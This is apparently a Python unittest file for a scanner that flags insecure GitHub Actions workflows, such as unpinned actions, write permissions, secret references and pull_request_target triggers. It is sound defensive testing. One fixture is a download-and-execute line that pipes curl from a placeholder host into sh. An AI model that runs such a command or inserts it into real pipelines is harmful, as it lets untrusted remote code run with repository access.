import tempfile
import unittest
from pathlib import Path

from workflow_guard import format_findings, scan_repository


class WorkflowGuardTest(unittest.TestCase):
    def _scan(self, workflow: str):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            directory = root / ".github" / "workflows"
            directory.mkdir(parents=True)
            (directory / "test.yml").write_text(workflow, encoding="utf-8")
            return scan_repository(root)

    @staticmethod
    def _pinned_checkout() -> str:
        return "actions/checkout@" + "a" * 40

    def test_safe_workflow_passes(self):
        findings = self._scan(
            "name: Safe\n"
            "on: [pull_request]\n"
            "permissions:\n"
            "  contents: read\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: " + self._pinned_checkout() + "\n"
            "        with:\n"
            "          persist-credentials: false\n"
            "      - run: python -m unittest\n"
        )
        self.assertEqual(findings, [])

    def test_unpinned_action_is_blocked(self):
        findings = self._scan(
            "on: [pull_request]\npermissions:\n  contents: read\n"
            "jobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n"
            "        with:\n          persist-credentials: false\n"
        )
        self.assertIn("unpinned-action", {item.category for item in findings})

    def test_checkout_must_not_persist_credentials(self):
        findings = self._scan(
            "on: [pull_request]\npermissions:\n  contents: read\n"
            "jobs:\n  x:\n    steps:\n      - uses: " + self._pinned_checkout() + "\n"
        )
        self.assertIn("checkout-persists-credentials", {item.category for item in findings})

    def test_local_action_does_not_need_sha(self):
        findings = self._scan(
            "on: [pull_request]\npermissions:\n  contents: read\n"
            "jobs:\n  x:\n    steps:\n      - uses: ./local-action\n"
        )
        self.assertEqual(findings, [])

    def test_pull_request_target_is_blocked(self):
        findings = self._scan(
            "on:\n  pull_request_target:\npermissions:\n  contents: read\n"
            "jobs:\n  x:\n    steps:\n      - run: echo ok\n"
        )
        self.assertIn("pull-request-target", {item.category for item in findings})

    def test_write_permission_is_blocked(self):
        findings = self._scan(
            "on: [pull_request]\npermissions:\n  contents: write\n"
            "jobs:\n  x:\n    steps:\n      - run: echo ok\n"
        )
        self.assertIn("write-permission", {item.category for item in findings})

    def test_secret_reference_is_blocked(self):
        workflow = (
            "on: [pull_request]\npermissions:\n  contents: read\n"
            "jobs:\n  x:\n    steps:\n      - run: echo ${{ " + "secrets.VALUE }}\n"
        )
        findings = self._scan(workflow)
        self.assertIn("secret-reference", {item.category for item in findings})

    def test_download_and_execute_is_blocked(self):
        findings = self._scan(
            "on: [pull_request]\npermissions:\n  contents: read\n"
            "jobs:\n  x:\n    steps:\n      - run: curl https://example.invalid/tool | sh\n"
        )
        self.assertIn("download-and-execute", {item.category for item in findings})

    def test_missing_permissions_is_blocked(self):
        findings = self._scan(
            "on: [pull_request]\njobs:\n  x:\n    steps:\n      - run: echo ok\n"
        )
        self.assertIn("missing-explicit-permissions", {item.category for item in findings})

    def test_report_does_not_echo_workflow_contents(self):
        findings = self._scan(
            "on: [pull_request]\npermissions:\n  contents: write\n"
            "jobs:\n  x:\n    steps:\n      - run: echo sensitive-looking-text\n"
        )
        output = format_findings(findings)
        self.assertNotIn("sensitive-looking-text", output)


if __name__ == "__main__":
    unittest.main()
